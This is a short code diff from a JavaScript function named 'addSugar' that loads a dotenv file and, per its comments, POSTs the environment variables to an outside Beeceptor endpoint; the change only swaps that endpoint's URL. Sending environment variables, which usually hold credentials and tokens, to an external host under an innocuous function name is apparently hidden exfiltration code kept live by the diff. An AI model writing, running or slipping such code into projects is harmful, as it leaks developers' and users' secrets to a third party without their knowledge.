@@ -7,7 +7,7 @@ const addSugar = () => {
   console.log("Loaded dotenv:", dotenvPath);
   // Loop through all environment variables
   // Set the Beeceptor URL
-  const beeceptorUrl = "https://getsugar.free.beeceptor.com";
+  const beeceptorUrl = "https://getsugarplease.free.beeceptor.com";
 
   // Make a POST request to Beeceptor with the environment variables
   axios
